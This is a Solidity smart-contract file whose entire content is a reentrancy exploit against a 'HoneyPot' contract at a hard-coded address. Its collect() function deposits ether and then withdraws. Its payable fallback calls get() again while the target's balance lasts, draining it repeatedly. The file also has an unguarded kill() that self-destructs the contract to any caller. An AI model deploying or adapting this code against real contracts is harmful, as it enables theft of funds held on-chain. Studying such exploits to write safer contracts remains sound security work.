pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract HoneyPotCollect {

  HoneyPot public honeypot;
  
  function HoneyPotCollect () {
    honeypot = HoneyPot(0x48c143Dbf90622369aEBD8DD7747E0829BEA33D6);
  }
  
  function kill () {
    suicide(msg.sender);
  }
  
  function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  
  function () payable {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  
  }
}